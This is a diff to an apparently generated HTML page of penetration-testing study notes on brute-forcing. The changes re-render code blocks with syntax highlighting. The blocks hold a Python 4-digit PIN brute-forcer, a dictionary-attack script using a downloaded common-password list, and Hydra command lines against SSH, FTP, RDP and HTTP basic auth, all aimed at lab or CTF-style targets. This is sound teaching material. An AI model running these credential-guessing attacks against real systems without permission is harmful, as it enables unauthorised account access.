@@ -1732,25 +1732,42 @@
 </tbody>
 </table>
 <h2 id="basic-python-brute-force-script">Basic Python Brute Force Script</h2>
-<pre><code class="language-python">import requests
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
 
-ip = &quot;127.0.0.1&quot;  # Change this to your instance IP address
-port = 1234       # Change this to your instance port number
+<span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>  <span class="c1"># Change this to your instance IP address</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">1234</span>       <span class="c1"># Change this to your instance port number</span>
 
-# Try every possible 4-digit PIN (from 0000 to 9999)
-for pin in range(10000):
-    formatted_pin = f&quot;{pin:04d}&quot;  # Convert the number to a 4-digit string (e.g., 7 becomes &quot;0007&quot;)
-    print(f&quot;Attempted PIN: {formatted_pin}&quot;)
+<span class="c1"># Try every possible 4-digit PIN (from 0000 to 9999)</span>
+<span class="k">for</span> <span class="n">pin</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">):</span>
+    <span class="n">formatted_pin</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">pin</span><span class="si">:</span><span class="s2">04d</span><span class="si">}</span><span class="s2">&quot;</span>  <span class="c1"># Convert the number to a 4-digit string (e.g., 7 becomes &quot;0007&quot;)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Attempted PIN: </span><span class="si">{</span><span class="n">formatted_pin</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 
-    # Send the request to the server
-    response = requests.get(f&quot;http://{ip}:{port}/pin?pin={formatted_pin}&quot;)
+    <span class="c1"># Send the request to the server</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">/pin?pin=</span><span class="si">{</span><span class="n">formatted_pin</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 
-    # Check if the server responds with success and the flag is found
-    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
-        print(f&quot;Correct PIN found: {formatted_pin}&quot;)
-        print(f&quot;Flag: {response.json()['flag']}&quot;)
-        break
-</code></pre>
+    <span class="c1"># Check if the server responds with success and the flag is found</span>
+    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">ok</span> <span class="ow">and</span> <span class="s1">&#39;flag&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">():</span>  <span class="c1"># .ok means status code is 200 (success)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Correct PIN found: </span><span class="si">{</span><span class="n">formatted_pin</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Flag: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">break</span>
+</code></pre></div></td></tr></table></div>
 <h2 id="common-wordlists">Common Wordlists</h2>
 <h2 id="wordlists">Wordlists</h2>
 <table>
@@ -1795,27 +1812,46 @@ for pin in range(10000):
 </tbody>
 </table>
 <h2 id="basic-python-dictionary-solver">Basic Python Dictionary Solver</h2>
-<pre><code class="language-python">import requests
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
 
-ip = &quot;127.0.0.1&quot;  # Change this to your instance IP address
-port = 1234       # Change this to your instance port number
+<span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>  <span class="c1"># Change this to your instance IP address</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">1234</span>       <span class="c1"># Change this to your instance port number</span>
 
-# Download a list of common passwords from the web and split it into lines
-passwords = requests.get(&quot;https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt&quot;).text.splitlines()
+<span class="c1"># Download a list of common passwords from the web and split it into lines</span>
+<span class="n">passwords</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
 
-# Try each password from the list
-for password in passwords:
-    print(f&quot;Attempted password: {password}&quot;)
+<span class="c1"># Try each password from the list</span>
+<span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Attempted password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 
-    # Send a POST request to the server with the password
-    response = requests.post(f&quot;http://{ip}:{port}/dictionary&quot;, data={'password': password})
+    <span class="c1"># Send a POST request to the server with the password</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">/dictionary&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
 
-    # Check if the server responds with success and contains the 'flag'
-    if response.ok and 'flag' in response.json():
-        print(f&quot;Correct password found: {password}&quot;)
-        print(f&quot;Flag: {response.json()['flag']}&quot;)
-        break
-</code></pre>
+    <span class="c1"># Check if the server responds with success and contains the &#39;flag&#39;</span>
+    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">ok</span> <span class="ow">and</span> <span class="s1">&#39;flag&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">():</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Correct password found: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Flag: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">break</span>
+</code></pre></div></td></tr></table></div>
 <h2 id="hybrid-attacks">Hybrid Attacks</h2>
 <p><img alt="Hybrid attacks" src="../../images/hybrid-attacks.png" /></p>
 <h2 id="brute-forcing-tools">Brute-Forcing Tools</h2>
@@ -1940,11 +1976,14 @@ for password in passwords:
 </tbody>
 </table>
 <h4 id="examples">Examples</h4>
-<pre><code class="language-bash">hydra -l root -p toor -M targets.txt ssh # Use the username &quot;root&quot;/Use the password &quot;toor&quot;/Target all IP addresses listed in the targets.txt file/Employ the ssh module for the attack
-hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp # Target the FTP service on ftp.example.com via port 2121
-hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp # Generate and test passwords ranging from 6 to 8 characters, using the specified character set
-hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81 # Target service is an HTTP server and the attack should be performed using HTTP GET requests to the root path ('/')
-</code></pre>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code>hydra<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-p<span class="w"> </span>toor<span class="w"> </span>-M<span class="w"> </span>targets.txt<span class="w"> </span>ssh<span class="w"> </span><span class="c1"># Use the username &quot;root&quot;/Use the password &quot;toor&quot;/Target all IP addresses listed in the targets.txt file/Employ the ssh module for the attack</span>
+hydra<span class="w"> </span>-L<span class="w"> </span>usernames.txt<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>-s<span class="w"> </span><span class="m">2121</span><span class="w"> </span>-V<span class="w"> </span>ftp.example.com<span class="w"> </span>ftp<span class="w"> </span><span class="c1"># Target the FTP service on ftp.example.com via port 2121</span>
+hydra<span class="w"> </span>-l<span class="w"> </span>administrator<span class="w"> </span>-x<span class="w"> </span><span class="m">6</span>:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>rdp<span class="w"> </span><span class="c1"># Generate and test passwords ranging from 6 to 8 characters, using the specified character set</span>
+hydra<span class="w"> </span>-l<span class="w"> </span>basic-auth-user<span class="w"> </span>-P<span class="w"> </span><span class="m">2023</span>-200_most_used_passwords.txt<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>http-get<span class="w"> </span>/<span class="w"> </span>-s<span class="w"> </span><span class="m">81</span><span class="w"> </span><span class="c1"># Target service is an HTTP server and the attack should be performed using HTTP GET requests to the root path (&#39;/&#39;)</span>
+</code></pre></div></td></tr></table></div>
 <h3 id="medusa">Medusa</h3>
 <h4 id="medusa-parameters">Medusa Parameters</h4>
 <table>
